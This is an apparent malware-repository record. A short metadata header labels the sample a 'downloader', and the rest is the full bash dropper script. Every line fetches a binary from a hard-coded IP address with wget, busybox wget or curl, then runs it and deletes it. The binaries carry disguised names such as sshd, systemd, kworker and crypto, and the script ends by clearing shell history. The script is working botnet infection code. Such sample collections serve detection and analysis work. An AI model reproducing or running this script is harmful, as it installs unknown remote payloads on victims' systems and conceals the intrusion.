# sha256: 586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b
# family: downloader
# kind: script
# size_bytes: 7295
# first_seen: 2026-09-16 05:26:36.551000 UTC
# times_seen: 2
# yara_matches: none
# ------------------------------------------------------------

#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/telnet; chmod +x telnet; ./telnet; rm -rf telnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/kworker; chmod +x kworker; ./kworker; rm -rf kworker
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/getty; chmod +x getty; ./getty; rm -rf getty
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/kernal; chmod +x kernal; ./kernal; rm -rf kernal
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/gnome; chmod +x gnome; ./gnome; rm -rf gnome
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/ntp; chmod +x ntp; ./ntp; rm -rf ntp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/ext4; chmod +x ext4; ./ext4; rm -rf ext4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/watchdogd; chmod +x watchdogd; ./watchdogd; rm -rf watchdogd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/systemd; chmod +x systemd; ./systemd; rm -rf systemd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/login; chmod +x login; ./login; rm -rf login
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/dbus; chmod +x dbus; ./dbus; rm -rf dbus
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/kde; chmod +x kde; ./kde; rm -rf kde
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://213.232.114.14/nokillbins/crypto; chmod +x crypto; ./crypto; rm -rf crypto
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/telnet; chmod +x telnet; ./telnet; rm -rf telnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/kworker; chmod +x kworker; ./kworker; rm -rf kworker
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/getty; chmod +x getty; ./getty; rm -rf getty
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/kernal; chmod +x kernal; ./kernal; rm -rf kernal
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/gnome; chmod +x gnome; ./gnome; rm -rf gnome
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/ntp; chmod +x ntp; ./ntp; rm -rf ntp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/ext4; chmod +x ext4; ./ext4; rm -rf ext4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/watchdogd; chmod +x watchdogd; ./watchdogd; rm -rf watchdogd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/systemd; chmod +x systemd; ./systemd; rm -rf systemd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/login; chmod +x login; ./login; rm -rf login
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/dbus; chmod +x dbus; ./dbus; rm -rf dbus
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/kde; chmod +x kde; ./kde; rm -rf kde
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://213.232.114.14/nokillbins/crypto; chmod +x crypto; ./crypto; rm -rf crypto
history -c
